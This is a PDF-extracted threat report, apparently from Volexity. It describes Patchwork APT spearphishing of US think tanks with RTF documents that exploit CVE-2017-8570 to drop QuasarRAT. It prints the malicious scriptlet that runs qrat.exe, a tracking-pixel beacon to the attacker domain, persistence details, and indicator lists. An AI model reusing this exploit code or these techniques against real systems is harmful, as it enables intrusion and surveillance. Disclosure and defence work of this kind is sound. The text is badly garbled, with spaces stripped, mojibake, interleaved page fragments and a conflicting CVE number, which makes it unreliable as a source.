@@ -1,0 +1,217 @@
+
+PRODUCTS 
+SERVICES 
+COMPANY 
+CONTACT 
+BLOG 
+
+
+Patchwork APT Group Targets US Think Tanks 
+JUNE 7, 2018 by Matthew Meltzer, Sean Koessel, Steven Adair 
+×ý×þþP 
+
+SEARCH 
+
+RECENT POSTS 
+Patchwork 
+APT 
+Group 
+Targets 
+US 
+Think 
+Tanks 
+
+Drupalgeddon 
+2: 
+Profiting 
+from 
+Mass 
+Exploitation 
+
+OceanLotus 
+Blossoms: 
+Mass 
+Digital 
+Surveillance 
+and 
+Attacks 
+Targeting 
+ASEAN, 
+Asian 
+Nations, 
+the 
+Media, 
+Human 
+Rights 
+Groups, 
+and 
+Civil 
+Society 
+
+Real 
+News, 
+Fake 
+Flash: 
+Mac 
+OS 
+X 
+Users 
+Targeted 
+
+PDFcreatedwiththePDFmyURLwebtoPDFAPI!
+InMarchandApril2018,Volexityidentifiedmultiplespearphishingcampaignsattributedto Patchwork,anIndianAPTgroupalsoknownasDroppingElephant.Thisincreaseinthreat activitywasconsistentwithotherobservationsdocumentedoverthelastfewmonthsin blogsby360ThreatIntelligenceCenteranalyzingattacksonChineseorganizationsand TrendMicronotingtargetsinSouthAsia.FromtheattacksobservedbyVolexity,whatis mostnotableisthatPatchworkhaspivoteditstargetingandhaslaunchedattacksdirectly againstUS-basedthinktanks.Volexityhasalsofoundthat,inadditiontosendingmalware lures,thePatchworkthreatactorsareleveraginguniquetrackinglinksintheire-mailsfor thepurposeofidentifyingwhichrecipientsopenedtheire-mailmessages. 
+Inthreeobservedspearphishingcampaigns,thethreatactorsleverageddomainsand themesmimickingthoseofwell-knownthinktankorganizationsintheUnitedStates.The groupliftedarticlesandthemesfromtheCouncilonForeignRelations(CFR),theCenterfor 
+
+Have 
+you 
+been 
+haunted 
+by 
+the 
+Gh0st 
+RAT 
+today? 
+
+
+ARCHIVES 
+June 
+2018 
+April 
+2018 
+November 
+2017 
+July 
+2017 
+March 
+2017 
+November 
+2016 
+October 
+2015 
+July 
+2015 
+June 
+2015 
+April 
+2015 
+October 
+2014 
+September 
+2014 
+
+PDFcreatedwiththePDFmyURLwebtoPDFAPI!StrategicandInternationalStudies(CSIS),andtheMercatorInstituteforChinaStudies 
+(MERICS)foruseintheirspearphishingluresandmaliciousRichTextFormat(RTF) 
+documents.Strangely,inonecase,thethreatactorsalsoappeartohaveusedadomain namesimilartotheForeignPolicyResearchInstitute(FPRI)inamessagepurportingtobe fromCFR.Eachofthespearphishingattackscontainedlinksto.docfiles,whichwerereally RTFdocumentsthatattempttoexploitCVE-2017-8750(CompositeMoniker).Thethreat actorsappeartohaveleveragedpubliclyavailableexploitcodethatcanbefoundonGithub attheURL:https://github.com/rxwx/CVE-2017-8570.Iftheexploitissuccessful,thethreat actorswillattempttodropandexecuteQuasarRAT.Detailsofthemalwareandthe associatedattacksarelistedbelow. 
+
+SpearPhishingMessages 
+Eache-mailwassentfromtheattacker-controlleddomainmailcenter.support.Thisdomain wasnotonlyusedtosendthephishinge-mails,butalsototrackwhichtargetsopenedthee-mail.WithineachoftheHTML-formattedmessages,anembeddedimagetagisusedto beaconhometotheattacker¡¯sdomain,containinganuniqueidentifierspecifictothe recipient. 
+<img src=3D¡±hxxps://www.mailcenter.support/track/<unique_32_byte_identifier>¡± width=3D¡±0¡å height=3D¡±0¡å /> 
+Whiletheuseofe-mailrecipienttracking,alinkedRTFdocument,andafinalpayload (QuasarRATvariant)remainedthesame,certainelementsdifferedacrosscampaigns observed.Detailsoneachofthemessagesarelistedbelow. 
+Message1: 
+
+
+TAGS 
+electionsvulnerabilitiesHong 
+Kong 
+exploitsGh0stDukes 
+
+Scanbox 
+Scanningjava 
+AfghanistanJapanChinaosxAdobe 
+FlashVPNAPTDrupalCiscodigital 
+surveillancespear 
+phishing 
+
+
+
+Message2: 
+
+PDFcreatedwiththePDFmyURLwebtoPDFAPI!Notes Multiplehyperlinkswithinthee-mailbodyleadtoamaliciousRTFdocument locatedattheURL hxxp://fprii.net/The_Four_Traps_for_China.doc. Thefprii.netdomainwasusedasthesenderaddress,aswellasthehosting locationofthemaliciousRTFdocument.Thestructureofthedomainmimics theForeignPolicyResearchInstitute(FPRI),whoseactualdomainisfpri.net. 
+
+Message3: 
+
+PDFcreatedwiththePDFmyURLwebtoPDFAPI!Notes ThehyperlinkedtextClickheretodownloadthereportwithinthee-mailbody leadtoamaliciousRTFdocumentlocatedattheURL hxxp://www.mericcs.org/GPPi_MERICS_Authoritarian_Advance_2018_1Q.doc. Themericcs.orgdomainwasusedasthesenderaddress,aswellasthehosting locationofthemaliciousRTFdocument.Thestructureofthedomainmimicsthe MercatorInstituteforChinaStudies(MERICS),whoseactualdomainis merics.org. 
+
+SampleMessage 
+Theimagebelowshowsanexampleofhowthespearphishingmessagewouldlooktoa recipient. 
+PDFcreatedwiththePDFmyURLwebtoPDFAPI!
+
+
+ExploitationandMalwareExecution 
+Uponopeningtheaboveattachments,therecipientwillbepresentedwithadocumentthat isadirectcopyofablogpostorreportreleasedbythethinktankorganizationbeing impersonated.Atfirstglance,everythingmightlooklegitimate,butinthebackgroundthe targetuserhaslikelyjustbeeninfectedwithQuasarRAT.QuasarRATisafreelyavailable 
+
+¡°remote(administration|access)tool¡±(RAT)writteninC#anddistributedviaGithub.This RATprovidesavarietyoffunctionalitythatmakesitparticularlyattractivetoanattacker. Thisincludes,butisnotlimitedto,thefollowing: 
+
+AESencryptionofnetworkcommunication Filemanagement Functionalitytodownload,upload,andexecutefiles Keylogging Remotedesktopaccess Remotewebcamviewing Reverseproxy BrowserandFTPclientpasswordrecovery 
+
+
+
+
+
+
+
+TheimagesbelowarewhatatargetuseropeningamaliciousRTFdocumentwouldseefrom withinMicrosoftWord. 
+PDFcreatedwiththePDFmyURLwebtoPDFAPI!
+PDFcreatedwiththePDFmyURLwebtoPDFAPI!
+WhenthemaliciousRTFdocumentisopened,twothingshappenthatallowtheattacker malwaretorun.First,the¡°packagertrick¡±isleveragedinordertoembedtheinitial QuasarRATdropper(qrat.exe)inthemaliciousRTFdocument.Itscalledthe¡°packagertrick¡± becauseanyfileembeddedinanRTFfileusingpackagerwillbeautomaticallydroppedto the%tmp%folder(c:\Users\%username%\AppData\Local\Temp)whentheRTFdocument isopened.Second,thethreatactorsexploitCVE-2017-8570toachievecodeexecutionviaa malicious¡°scriptlet¡±file,or.sctfile,whichisalsoembeddedinthemaliciousRTFdocument. Thecontentsofthemaliciousscriptletfile(displayedbelow)clearlyshowthethreatactor executingtheinitial¡°qrat.exe¡±dropperfromthecurrentuser¡¯s%tmp%directory. 
+PDFcreatedwiththePDFmyURLwebtoPDFAPI!
+Note: The scriptlet code is an exact match to that shown on the Github page referenced earlier for CVE-2017-8750. The string ¡°fjzmpcjvqp¡± is unique and not something likely to be present if the code was not generated with the same public POC exploit code. 
+<?XMLversion=¡±1.0¡å?> <scriptlet> <registrationdescription=¡±fjzmpcjvqp¡± progid=¡±fjzmpcjvqp¡± version=¡±1.00¡å classid=¡±{204774CF-D251-4F02-855B-2BE70585184B}¡± remotable=¡±true¡±> </registration> <scriptlanguage=¡±JScript¡±> <![CDATA[ 
+varr=newActiveXObject(¡°WScript.Shell¡±).Run(¡°cmd/c %tmp%\\qrat.exe¡±,0,false); 
+exit(); ]]> </script> </scriptlet> 
+Aftertheinitialdropper(qrat.exe)hasbeenexecutedbytheembeddedscriptlet,itcreatesa directoryinC:\Users\%username%\AppData\Roaming\Microsoft 
+
+Network\microsoft_network\1.0.0.0andunpacks/dropsthefinalQuasarRATbinary namedmicrosoft_network.exe. 
+
+Themalwarealsocontainsanembedded.NETwrapperDLLforcreatingandmanaging scheduledtasksonWindowssystems.Thefile,namedMicrosoft.Win32.TaskScheduler.dll, isdigitallysignedbyacertificatefromAirVPN. 
+PDFcreatedwiththePDFmyURLwebtoPDFAPI!ThisDLLisusedtocreateascheduledtaskthatpointstotheQuasarRATbinary, microsoft_network.exe,allowingittoremainpersistentafterreboot. 
+
+Asseenintheimageabove,theQuasarRATscheduledtaskisnamed Microsoft_Security_Taskandrunsat12:00AMeachday.Oncethetaskistriggered,itwill thenrepeatevery5minutesfor60days.Whenexecuted,microsoft_network.exewill initiatearequesttofreegeoip.netinordertodeterminethegeographicallocationofthe infectedhost.Immediatelyfollowingtherequest,themalwarewillbegintobeaconoveran encryptedconnectiontothethreatactor¡¯scommandandcontroldomaintautiaos.com (43.249.37.199).SeveralrelatedsampleswereidentifiedandareincludedintheFile Indicatorssectionbelow. 
+
+Conclusion 
+TheadditionofUS-basedthinktankstothelistoforganizationsinthecrosshairsof Patchworkshowsanincreasingdiversityinthegeographicregionsbeingtargeted.While therewereafewpeculiarcomponentstosomeofthespearphishmessages,thecampaigns andthemeswerestrategicallyrelevanttotheorganizationsbeingtargeted.ThePatchwork threatactorsalsoappeartohaveadoptedatechniqueseenfromotherAPTgroupswhere 
+theyarenowtrackingtheeffectivenessoftheircampaignsbyrecordingwhichrecipients haveopenedthephishingmessage.Thisinformationallowsathreatactortodetermineif theirmessagesweredelivered,whichusersaremoresusceptibletoopeningthem,and basicinformationregardingthetarget¡¯soperatingsystemande-mailclient(orbrowser). Finally,althoughthepayloadobservedbeingdeliveredbyPatchworkinthesecampaignsis areadilyavailableopensourceRAT,itdoesallowforflexibilityininteractingwith compromisedmachineswithoutneedingtousecustommalware.Volexityisactively trackingthisgroupandtheinfrastructurecurrentlyinuseforthebenefitofitsnetwork securitymonitoringandthreatintelligencecustomers. 
+PDFcreatedwiththePDFmyURLwebtoPDFAPI!FileIndicators SamplesObservedfromSpearPhishingMessagesAbove 
+
+PDFcreatedwiththePDFmyURLwebtoPDFAPI!SHA1 
+3f1f3e838a307aff52fbcb5bba5e4c8fe68c30e5 
+Notes 
+MaliciousRTFdocumentthatexploitsCVE-2017-8570anddropsQuasarRATfileqrat.exe. 
+FilenameThe_Four_Traps_for_China.docFileSize4428595bytesMD57659c41a30976d523bb0fbb8cde49094SHA13f1f3e838a307aff52fbcb5bba5e4c8fe68c30e5NotesMaliciousRTFdocumentthatexploitsCVE-2017-8570anddropsQuasarRATfileqrat.exe.Filenameqrat.exeFileSize1093120bytesMD5c05e5131b196f43e1d02ca5ccc48ec0eSHA1f28c592833f234c619917b5c7d8974840a810247NotesDropperthatinstallsQuasarRATfilemicrosoft_network.exeandscheduledtaskwrapperfileMicrosoft.Win32.TaskScheduler.dll.Filenamemicrosoft_network.exeFileSize846336bytesMD59e4c373003c6d8f6597f96fc3ff1f49cPDFcreatedwiththePDFmyURLwebtoPDFAPI!SHA1  b7319a5ccf605fb2ff7760130e212728bccad323  
+Notes  QuasarRATfilethatbeaconstohardcodedIP43.249.37.199andthedomaintautiaos.com.Fileisdroppedto  
+C:\Users\%USERNAME%\AppData\Roaming\Microsoft Network\microsoft_network\1.0.0.0\microsoft_network.exe.  
+
+
+
+AdditionalObservedMalwareFiles 
+FilenameArmed-Forces-Officers.docFileSize3226435bytesMD589beb207e7095d237c4d25c4c6e17e97SHA115010f7cea913f2a36c56da7d73c2b9eb5a3878fNotesMaliciousRTFdocumentthatexploitsCVE-2017-8570anddropsaDelphiRATwiththefilenamevsrss.exe.PDFcreatedwiththePDFmyURLwebtoPDFAPI!FilenamePart-I.docFileSize11349102bytesMD592942c54224cd462dd201ae11a560bb8SHA185a21624df2211af3daf05c86a3fbea8271059d3NotesMaliciousRTFdocumentthatexploitsCVE-2017-8570anddropsQuasarRATfileqrat.exe.Thisisthesamefiledescribedabove.FilenamePart-II.docFileSize10156713bytesMD5e32668e569362c96cc56db368b7e821eSHA1dadc493abbe3e21610539e1d5a42f523626a6132NotesMaliciousRTFdocumentthatexploitsCVE-2017-8570anddropsQuasarRATfilemico-audio.exe.Uponexecutionitwillbeinstalledunderthefilenamecrome.exe.Filenamevsrss.exeFileSize446976bytesMD55c3456d5932544b779fe814133344fdbSHA17ab750afb25457a81c27a98dc6dfd51c27e61b0eNotesDelphiRATfilethatbeaconstoebeijingcn.live.PDFcreatedwiththePDFmyURLwebtoPDFAPI!
+
+
+NetworkIndicators 
+
+mailcenter.support 
+chinapolicyanalysis.org 
+fprii.net 
+mericcs.org 
+221.121.138.139 
+185.130.212.168 
+185.130.212.254 
+221.121.138.141 
+Domainusedtoforsendingspearphishes andusertracking. 
+Domainusedforspearphishsendere-mail addressandtohostmaliciousdocuments. 
+Domainusedforspearphishsendere-mail addressandtohostmaliciousdocuments. 
+Domainusedforspearphishsendere-mail addressandtohostmaliciousdocuments. 
+PDFcreatedwiththePDFmyURLwebtoPDFAPI!tautiaos.com 
+sastind-cn.org 
+ebeijingcn.live 
+43.249.37.199 
+209.58.176.201 
+209.58.169.91 
+Commandandcontrolserverobservedfrom QuasarRATmalware. 
+Commandandcontrolserverobservedfrom QuasarRATmalware. 
+Commandandcontrolserverobservedfrom DelphiRATmalware. 
+ABOUTAboutUsBlogPrivacyPolicySOLUTIONSRequestADemoProductsServicesCONTACT11654PlazaAmericaDr#774Reston,VA20190-4700©ñ1-888-825-1975©òPDFcreatedwiththePDFmyURLwebtoPDFAPI!
+×ú×û×ü©ø 
+
+PDFcreatedwiththePDFmyURLwebtoPDFAPI!
+
